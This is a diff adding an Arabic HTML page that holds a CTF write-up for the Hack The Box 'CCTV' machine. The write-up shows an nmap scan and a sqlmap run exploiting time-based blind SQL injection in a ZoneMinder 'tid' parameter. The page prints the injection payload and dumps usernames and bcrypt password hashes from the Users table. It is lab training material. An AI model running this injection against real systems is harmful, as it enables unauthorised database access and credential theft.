@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#07110d">
+  <meta name="color-scheme" content="dark light">
+  <meta name="description" content="تقرير CTF تقني لتحدي CCTV HTB Machine على منصة Hack The Box.">
+  <title>CCTV HTB Machine | Ft7y.Sec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="../avatar.png" type="image/png">
+</head>
+<body>
+  <a class="skip-link" href="#main-content">تخطي إلى المحتوى</a>
+  <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+  <div class="page-noise" aria-hidden="true"></div>
+  <canvas id="particles-canvas"></canvas>
+  <header class="navbar" id="navbar">
+    <div class="logo"><a href="../index.html#home">Ft7y<span>.Sec</span></a></div>
+    <nav class="nav-links" id="nav-menu" aria-label="التنقل الرئيسي"><ul>
+      <li><a href="../index.html#home">الرئيسية</a></li>
+      <li><a href="../pentest.html">اختبار الاختراق</a></li>
+      <li><a href="../appsec.html">أمن التطبيقات</a></li>
+      <li><a href="../automation.html">البرمجة والأتمتة</a></li>
+      <li><a href="../systems-labs.html">الأنظمة والمعامل</a></li>
+      <li><a href="../writeups.html">CTF Write-ups</a></li>
+      <li><a href="../index.html#contact">تواصل معي</a></li>
+    </ul></nav>
+    <div class="nav-actions">
+      <button id="theme-toggle" class="btn-secondary" type="button" title="تبديل الوضع" aria-label="تبديل الوضع"><i class="fa-solid fa-moon"></i></button>
+      <button class="mobile-toggle" id="mobile-toggle" type="button" aria-label="القائمة"><i class="fa-solid fa-bars"></i></button>
+    </div>
+  </header>
+  <main id="main-content" class="subpage-container ctf-report-page">
+    <article class="ctf-report-article">
+      <header class="subpage-hero ctf-report-hero" data-aos="fade-up">
+        <nav class="breadcrumb-nav" aria-label="مسار التنقل"><a href="../index.html"><i class="fa-solid fa-house"></i> الرئيسية</a><span class="sep">/</span><a href="index.html">تقارير CTF</a><span class="sep">/</span><span class="current">CCTV HTB Machine</span></nav>
+        <div class="writeup-header"><span class="platform-tag htb"><i class="fa-solid fa-cube"></i> Hack The Box</span><span class="ctf-directory-label"><i class="fa-solid fa-shield-halved"></i> بيئة تدريبية مصرح بها</span></div>
+        <h1 class="subpage-hero-title">CCTV HTB Machine</h1>
+        <p class="subpage-hero-desc">توثيق تقني محفوظ من المصدر الأصلي في Notion، يشمل الخطوات والأوامر والنتائج ولقطات الشاشة المتاحة.</p>
+        <a href="index.html" class="btn-outline ctf-back-link"><i class="fa-solid fa-arrow-right"></i> العودة إلى تقارير CTF</a>
+      </header>
+      <div class="ctf-report-content" data-aos="fade-up"><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nmap -sV -sC -Pn 10.129.50.173                                      
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-08 17:12 +0300
+Nmap scan report for 10.129.50.173
+Host is up (0.096s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
+80/tcp open  http    Apache httpd 2.4.58
+|_http-title: Did not follow redirect to http://cctv.htb/
+Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 74.79 seconds
+                                                                                                                                   
+┌──(kali㉿kali)-[~/Downloads]
+└─$ 
+</code></pre></section><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ echo &#39;10.129.50.173 cctv.htb&#39; |sudo tee -a /etc/hosts
+10.129.50.173 cctv.htb</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-machine-1.png" alt="لقطة شاشة من تقرير CCTV HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير CCTV HTB Machine</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-machine-2.png" alt="لقطة شاشة من تقرير CCTV HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير CCTV HTB Machine</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/cctv-machine-3.png" alt="لقطة شاشة من تقرير CCTV HTB Machine" loading="lazy"><figcaption>لقطة شاشة من تقرير CCTV HTB Machine</figcaption></figure><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ sqlmap -u &quot;http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1&quot; \
+-D zm -T Users -C Username,Password --dump --batch \
+--dbms=MySQL --technique=T \
+--cookie=&quot;ZMSESSID=iapklkkpdtihs4usubfk0ameo9&quot; \
+--time-sec=2
+        ___
+       __H__                                                                                                                       
+ ___ ___[)]_____ ___ ___  {1.9.5#stable}                                                                                           
+|_ -| . [.]     | .&#39;| . |                                                                                                          
+|___|_  [&#39;]_|_|_|__,|  _|                                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:33:34 /2026-05-09/
+
+[17:33:34] [INFO] testing connection to the target URL
+[17:33:35] [WARNING] heuristic (basic) test shows that GET parameter &#39;view&#39; might not be injectable
+[17:33:35] [INFO] testing for SQL injection on GET parameter &#39;view&#39;
+[17:33:35] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[17:33:35] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)      
+[17:33:44] [WARNING] GET parameter &#39;view&#39; does not seem to be injectable
+[17:33:44] [WARNING] heuristic (basic) test shows that GET parameter &#39;request&#39; might not be injectable
+[17:33:44] [INFO] testing for SQL injection on GET parameter &#39;request&#39;
+[17:33:44] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[17:33:45] [WARNING] GET parameter &#39;request&#39; does not seem to be injectable
+[17:33:46] [WARNING] heuristic (basic) test shows that GET parameter &#39;action&#39; might not be injectable
+[17:33:46] [INFO] testing for SQL injection on GET parameter &#39;action&#39;
+[17:33:46] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[17:33:47] [WARNING] GET parameter &#39;action&#39; does not seem to be injectable
+[17:33:47] [WARNING] heuristic (basic) test shows that GET parameter &#39;tid&#39; might not be injectable
+[17:33:48] [INFO] testing for SQL injection on GET parameter &#39;tid&#39;
+[17:33:48] [INFO] testing &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;
+[17:33:53] [INFO] GET parameter &#39;tid&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable 
+for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and risk (1) values? [Y/n] Y
+[17:33:53] [INFO] checking if the injection point on GET parameter &#39;tid&#39; is a false positive
+GET parameter &#39;tid&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
+---
+Parameter: tid (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: view=request&amp;request=event&amp;action=removetag&amp;tid=1 AND (SELECT 4841 FROM (SELECT(SLEEP(2)))tkZz)
+---
+[17:34:02] [INFO] the back-end DBMS is MySQL
+[17:34:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL &gt;= 5.0.12
+[17:34:03] [INFO] fetching entries of column(s) &#39;Password,Username&#39; for table &#39;Users&#39; in database &#39;zm&#39;
+[17:34:03] [INFO] fetching number of column(s) &#39;Password,Username&#39; entries for table &#39;Users&#39; in database &#39;zm&#39;
+[17:34:03] [INFO] retrieved: 3
+[17:34:11] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+$2y$10$cmy
+[17:35:50] [ERROR] invalid character detected. retrying..
+tVWFRn
+[17:36:54] [ERROR] invalid character detected. retrying..
+t1XfqsItsJR^X@sgVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
+[17:43:16] [INFO] retrieved: superadmin
+[17:44:32] [INFO] retrieved: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
+[17:53:51] [INFO] retrieved: mark
+[17:54:20] [INFO] retrieved: $2y$10$t
+[17:55:40] [ERROR] invalid character detected. retrying..
+5z8uIT.n9uCdHCNidcLf.39T
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+1y
+Ui9nrlCkdXrzJMnJgkT
+[18:02:46] [ERROR] invalid character detected. retrying..
+iAvRUM6m
+[18:04:00] [INFO] retrieved: admin
+Database: zm
+Table: Users
+[3 entries]
++------------+--------------------------------------------------------------+
+| Username   | Password                                                     |
++------------+--------------------------------------------------------------+
+| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
+| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
++------------+--------------------------------------------------------------+
+
+[18:04:37] [INFO] table &#39;zm.Users&#39; dumped to CSV file &#39;/home/kali/.local/share/sqlmap/output/cctv.htb/dump/zm/Users.csv&#39;
+[18:04:37] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1690 times
+[18:04:37] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/cctv.htb&#39;
+[18:04:37] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:04:37 /2026-05-09/
+
+                                                                                                                                   
+┌──(kali㉿kali)-[~/Downloads]
+</code></pre></section></div>
+      <footer class="ctf-report-end"><a href="index.html" class="btn-primary"><i class="fa-solid fa-arrow-right"></i> كل تقارير CTF</a></footer>
+    </article>
+  </main>
+  <footer class="footer"><div class="footer-content">
+    <div class="footer-logo">Ft7y<span>.Sec</span></div>
+    <div class="footer-links">
+      <a href="../index.html#home">الرئيسية</a><a href="../pentest.html">اختبار الاختراق</a><a href="../appsec.html">أمن التطبيقات</a><a href="../automation.html">البرمجة والأتمتة</a><a href="../systems-labs.html">الأنظمة والمعامل</a><a href="../writeups.html">CTF Write-ups</a>
+    </div>
+    <p>© 2026 Ft7y.Sec. جميع الحقوق محفوظة.</p>
+  </div></footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
